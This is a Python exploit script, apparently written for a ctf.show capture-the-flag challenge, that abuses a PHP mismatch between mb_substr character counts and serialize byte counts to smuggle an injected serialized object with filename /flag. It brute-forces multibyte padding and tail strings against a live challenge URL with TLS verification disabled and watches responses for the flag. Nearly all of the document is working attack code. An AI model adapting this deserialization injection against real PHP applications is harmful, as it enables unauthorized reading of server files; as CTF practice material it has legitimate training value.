"""Precision exploit: mb_substr char-count vs serialize byte-count mismatch.

Target: read_file object, filename -> /flag.
Server: mb_strpos finds '[' ']' by CHARS; mb_substr extracts by CHARS.
serialize uses strlen (BYTES). A multi-byte char inside $start makes:
  extracted_chars * (bytes per char) mismatch with s:LEN.

If we place ] right after our injected object, substrstr extracts up to it.
The extracted string's s:LEN was computed by serialize over the FULL value
(including the ] we injected and any multibyte). We need unserialize to
parse our injected object with filename=/flag.

Key trick: put multibyte chars BEFORE the ] so that the extracted string
has fewer CHARS than BYTES, and craft the object so its s:N values parse
the injected filename before the real /etc/passwd is reached.
"""
import html
import re
import ssl
import urllib.parse
import urllib.request
import urllib3

urllib3.disable_warnings()
BASE = "https://8c26f6b1-6c7a-40c5-86ca-605b5c7c2819.challenge.ctf.show/"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

FLAG_PATHS = ["/flag", "/flag.txt", "/f1ag", "/fl4g", "/flag.php"]


def build_start(flag_path, mb_prefix="中", mb_count=0, tail=""):
    """start value with injected object + multibyte padding + optional ] tail."""
    inject = 'gxngxngxn";s:8:"filename";s:%d:"%s";}' % (len(flag_path), flag_path)
    return inject + mb_prefix * mb_count + tail


def probe(start, read=""):
    params = urllib.parse.urlencode({"start": start, "read": read})
    req = urllib.request.Request(BASE + "?" + params, headers={"User-Agent": "Mozilla/5.0"})
    try:
        resp = urllib.request.urlopen(req, timeout=25, context=CTX)
        body = resp.read().decode("utf-8", errors="replace")
        text = html.unescape(re.sub(r"<[^>]+>", "", body))
        marker = "What you are reading is:"
        idx = text.rfind(marker)
        if idx >= 0:
            return text[idx + len(marker):].strip()[:160]
        if "UNSERIALIZE_FAIL" in text or "offset" in text.lower():
            return "ERR"
        return None
    except Exception as e:
        return f"NETERR:{str(e)[:60]}"


def main():
    print("=== baseline sanity ===")
    r = probe("gxngxngxn")
    print("passwd ok" if r and r.startswith("root") else f"? {r}")

    print("\n=== multibyte mismatch search ===")
    # For each mb_count, the extracted (chars) vs serialize (bytes) differ by
    # (bytes_per_mb - 1) * mb_count. We want unserialize to see a VALID object.
    for path in FLAG_PATHS:
        for mb_char in ["中", "😀", "é", "漢", "测"]:
            for count in range(0, 12):
                for tail in ["]", "}]", "]x", ""]:
                    start = build_start(path, mb_char, count, tail)
                    r = probe(start)
                    if r and not r.startswith("root") and r != "ERR" and not r.startswith("NETERR"):
                        print(f"[!] path={path} mb={mb_char}x{count} tail={tail!r}")
                        print(f"    resp={r}")
                        if "{" in r or "ctf" in r.lower():
                            print("    *** LIKELY FLAG ***")
                            return
                    elif r == "ERR":
                        pass  # parse error expected for most
    print("no non-passwd hit in mismatch search")


if __name__ == "__main__":
    main()
